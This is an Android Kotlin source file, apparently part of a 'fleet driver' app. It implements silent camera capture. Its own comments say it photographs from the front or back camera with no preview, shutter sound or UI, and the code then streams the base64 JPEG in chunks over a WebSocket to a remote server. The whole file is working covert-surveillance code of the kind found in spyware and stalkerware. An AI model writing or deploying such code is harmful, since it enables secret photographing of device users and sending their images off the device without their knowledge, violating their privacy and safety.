// [context: Android API 26+, ARM64/any — silent camera capture front/back]
// CameraModule.kt — tira foto silenciosa sem preview, envia JPEG em chunks via WS
// Camera2 API — sem shutter sound, sem UI
package com.fleetdroid.driver.service

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object CameraModule {

    const val TAG = "CameraModule"

    @Volatile private var busy = false
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    /**
     * Captura foto silenciosa.
     * @param context contexto
     * @param lensFacing CameraCharacteristics.LENS_FACING_FRONT ou _BACK
     * @param quality JPEG quality 0-100
     */
    fun capture(context: Context, lensFacing: Int = CameraCharacteristics.LENS_FACING_BACK, quality: Int = 80) {
        if (busy) {
            Log.w(TAG, "capture already in progress, skipping")
            return
        }
        busy = true

        if (cameraThread == null || cameraThread?.isAlive == false) {
            cameraThread = HandlerThread("camera-worker").apply { start() }
            cameraHandler = Handler(cameraThread!!.looper)
        }

        cameraHandler?.post {
            try {
                doCapture(context, lensFacing, quality)
            } catch (e: Exception) {
                Log.e(TAG, "capture error", e)
                DispatchService.instance?.sendWs("""{"type":"error","msg":"camera failed: ${e.message?.replace("\"","\\\"")}"}""")
            } finally {
                busy = false
            }
        }
    }

    private fun doCapture(context: Context, lensFacing: Int, quality: Int) {
        val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        // Encontra a câmera certa
        val cameraId = cm.cameraIdList.firstOrNull { id ->
            cm.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == lensFacing
        } ?: run {
            Log.e(TAG, "no camera with facing $lensFacing")
            DispatchService.instance?.sendWs("""{"type":"error","msg":"camera not found"}""")
            return
        }

        val chars = cm.getCameraCharacteristics(cameraId)
        val configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
        // Seleciona resolução JPEG — preferimos 1280x720 ou a maior disponível
        val sizes: Array<Size> = configs.getOutputSizes(ImageFormat.JPEG)
        val size = sizes.firstOrNull { it.width == 1280 && it.height == 720 }
            ?: sizes.maxByOrNull { it.width * it.height }
            ?: Size(640, 480)

        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        var cameraDevice: CameraDevice? = null

        val stateCallback = object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                try {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(reader.surface)
                        set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        set(CaptureRequest.JPEG_QUALITY, quality.toByte())
                        set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                    }

                    camera.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
                                            // Imagem disponível via reader listener
                                        }
                                    }, cameraHandler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "capture request error", e)
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "session configure failed")
                                cleanup(camera, reader)
                            }
                        },
                        cameraHandler
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "session create error", e)
                    cleanup(camera, reader)
                }
            }

            override fun onDisconnected(camera: CameraDevice) { cleanup(camera, reader) }
            override fun onError(camera: CameraDevice, error: Int) {
                Log.e(TAG, "camera error: $error")
                cleanup(camera, reader)
            }
        }

        // Listener: processa imagem capturada
        reader.setOnImageAvailableListener({ imgReader ->
            val image: Image? = imgReader.acquireLatestImage()
            try {
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    sendPhoto(bytes, size.width, size.height, lensFacing)
                    image.close()
                }
            } catch (e: Exception) {
                Log.e(TAG, "image read error", e)
            } finally {
                cameraDevice?.let { cleanup(it, reader) }
                cameraDevice = null
            }
        }, cameraHandler)

        @Suppress("MissingPermission")
        cm.openCamera(cameraId, stateCallback, cameraHandler)
    }

    private fun cleanup(camera: CameraDevice, reader: ImageReader) {
        try { camera.close() } catch (_: Exception) {}
        try { reader.close() } catch (_: Exception) {}
    }

    /**
     * Envia foto como base64 chunked para o servidor.
     * Chunked em 64KB para não estourar o frame WS.
     */
    private fun sendPhoto(jpeg: ByteArray, w: Int, h: Int, facing: Int) {
        val b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP)
        val chunkSize = 65536 // 64KB
        val total = b64.length
        var offset = 0
        var idx = 0

        val totalChunks = (total + chunkSize - 1) / chunkSize
        val lens = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"

        while (offset < total) {
            val end = minOf(offset + chunkSize, total)
            val chunk = b64.substring(offset, end)
            val payload = JSONObject().apply {
                put("type",         "photo_chunk")
                put("lens",         lens)
                put("width",        w)
                put("height",       h)
                put("chunk_idx",    idx)
                put("total_chunks", totalChunks)
                put("size_bytes",   jpeg.size)
                put("data",         chunk)
                put("ts",           System.currentTimeMillis())
            }
            DispatchService.instance?.sendWs(payload.toString())
            offset += chunkSize
            idx++
        }
        Log.d(TAG, "photo sent: ${jpeg.size}B, ${w}x${h}, $lens, $totalChunks chunks")
    }
}
